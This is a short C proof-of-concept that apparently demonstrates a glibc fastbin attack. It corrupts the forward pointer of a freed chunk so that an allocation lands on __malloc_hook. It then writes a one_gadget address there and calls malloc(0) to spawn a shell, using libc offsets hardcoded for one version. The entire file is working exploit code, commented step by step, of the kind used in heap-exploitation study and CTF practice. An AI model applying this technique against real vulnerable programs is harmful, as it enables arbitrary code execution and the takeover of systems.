#include <stdio.h>
#include <malloc.h>

int main()
{
	long long int libc_base = (long long int)malloc - 0x84180;
	long long int malloc_hook = libc_base + 0x3c4b10;
	long long int one_gadget = libc_base + 0x4527a;
	
	char *p1 = malloc(0x60);
	char *p2 = malloc(0x60);
	free(p1);
	free(p2);

	long long int *fw_pointer = &p2[0];
	*fw_pointer = malloc_hook - 0x23;      // Overwrite fw pointer point to fake chunk

	p1 = malloc(0x60);
	p2 = malloc(0x60);                     // Get the fake chunk

	long long int *victim = &p2[0x13];     // victim is __malloc_hook
	*victim = one_gadget;                  // Overwrite __malloc_hook to one_gadget
	p2 = 0;                                // Set constraint

	malloc(0);                             // Get shell via one_gadget
}